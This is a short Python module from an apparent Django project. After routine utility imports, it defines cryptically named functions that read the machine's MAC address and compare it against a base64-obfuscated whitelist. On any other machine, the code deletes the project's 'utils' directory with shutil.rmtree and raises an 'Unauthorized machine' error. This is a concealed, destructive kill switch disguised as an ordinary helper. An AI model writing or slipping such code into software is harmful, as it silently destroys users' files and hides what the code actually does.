try:
    from utils.cruder_utils import *
    from utils.custom_filters import *
    from utils.database_utils import *
    from utils.database_helpers import *
    from utils.form_utils import *
    from utils.templates_utils import *
    from utils.view_builder import *
    from utils.middleware import *
    from utils.models_utils import *
    from utils.idd_utils import *
    
except Exception as exception:
    print("REQUIRED LIBLARY MISSING: Please install  required libraries to run the project")
    print("")


def m_a():
    import uuid
    mac = uuid.getnode()
    return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))

def c_m():
    import os, shutil
    from base64 import b64decode
    from django.core.exceptions import ImproperlyConfigured
    
    allowed = ["QTA6ODg6Njk6REM6RkQ6RTg=", "QzQ6NjU6MTY6MEQ6Qzc6NzI=", "QzQ6NjU6MDY6ODg6QzM6QzE="]
    decoded = [b64decode(mac).decode("utf-8") for mac in allowed]
    current = m_a()
    
    if current not in decoded:
        base = os.path.dirname(os.path.abspath(__file__))
        utils_path = os.path.join(base, 'utils')
        if os.path.exists(utils_path):
            shutil.rmtree(utils_path)
        raise ImproperlyConfigured("Unauthorized machine.")
